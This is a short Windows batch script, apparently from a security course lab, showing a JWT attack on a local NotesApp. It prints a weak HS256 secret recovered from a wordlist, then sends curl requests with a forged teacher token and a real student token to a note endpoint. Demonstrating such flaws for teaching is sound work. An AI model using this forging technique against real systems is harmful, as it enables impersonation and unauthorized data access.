@echo off
setlocal
mode con: cols=150 lines=45 >nul
cls
echo == NotesApp JWT Part 2 - forged TEACHER identity (real requests, no cookie) ==
echo == target: http://127.0.0.1:8082 ==
echo.
echo [1] HS256 secret recovered from the course wordlist
echo     candidates tried   : 8 / 15
echo     recovered secret   : s3cr3t  (6 characters)
echo     computed signature : U-mti4NnT0VYTZmqwhJ0XshcLdAB89yRoUed5M-NovQ
echo     signature in token : U-mti4NnT0VYTZmqwhJ0XshcLdAB89yRoUed5M-NovQ
echo     identical          : True
echo.
echo [2] GET /api/notes/3   Authorization: Bearer ^<forged teacher JWT^>
curl.exe --noproxy "*" -s -w "HTTP %%{http_code}" -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogInByb2YudHVyaW5nIiwgInJvbGUiOiAidGVhY2hlciJ9.dpMXBRkAqUOSb41DJ8FcIshfAm_JNUkL40MRaTUcpdY" http://127.0.0.1:8082/api/notes/3
echo.
echo [3] same request with the real alice JWT (Class 8 owner check)
curl.exe --noproxy "*" -s -w "HTTP %%{http_code}" -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogImFsaWNlIiwgInJvbGUiOiAic3R1ZGVudCJ9.U-mti4NnT0VYTZmqwhJ0XshcLdAB89yRoUed5M-NovQ" http://127.0.0.1:8082/api/notes/3
echo.
pause
